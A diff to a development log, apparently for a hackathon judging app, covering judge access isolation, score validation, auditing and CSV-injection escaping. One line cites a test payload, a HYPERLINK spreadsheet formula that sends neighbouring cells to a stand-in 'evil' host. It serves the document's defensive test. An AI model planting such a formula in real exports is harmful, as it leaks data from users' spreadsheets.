@@ -85,3 +85,20 @@ What `run.py` taught me:
   with `db.add` did not appear in the already-loaded `event.tracks` collection. Append through relationships.
 - An inline `onclick` would have been silently blocked by our own CSP. Kept the CSP, dropped the inline JS.
 - Test suite went from 138s to 77s by using bcrypt cost 4 in tests only (BCRYPT_ROUNDS env var).
+## 2026-09-27 — Judge isolation and CSV (run.py 7/7)
+
+- `/api/judge/scores?judge=X`: judges get 403 for ANY other id, including ids that don't exist, so the endpoint
+  can't be used to discover which judge ids are real. Staff asking for an unknown id get 404 (they may know).
+- Scoring needs an assignment AND the project's track in the judge's tracks. Test: an organizer mis-assigns
+  judge_a to a trk_03 project; judge_a still gets 404 and no score row is written. Defence in depth.
+- A judge scoring "someone else's" project writes their own row (unique judge+project); they can never
+  overwrite another judge's row, because the row is looked up by (current_user.id, project_id).
+- Score values: whole numbers 1-5 only ("4.5" and "6" are 422), every rubric criterion required, unknown keys
+  rejected. The DB CHECK is the backstop.
+- Every score create/update is audited with before and after values.
+- CSV injection: cells starting with = + - @ TAB CR get a leading apostrophe. Test uses a
+  `=HYPERLINK("http://evil/?"&A1,...)` title, which would otherwise leak neighbouring cells when opened.
+- run.py 7/7 PASS but .dogfood.toml still claims only T1: the T2 *tier* also needs assignment, rubric editing,
+  dashboard, normalization, publishing and the audit UI. Passing the checker != finishing the tier.
+- Test-writing lesson: asserting `"scores" not in resp.text` failed because the error message says "scores".
+  Assert on structure (no `scores` key, no `weighted_total`), not on words.
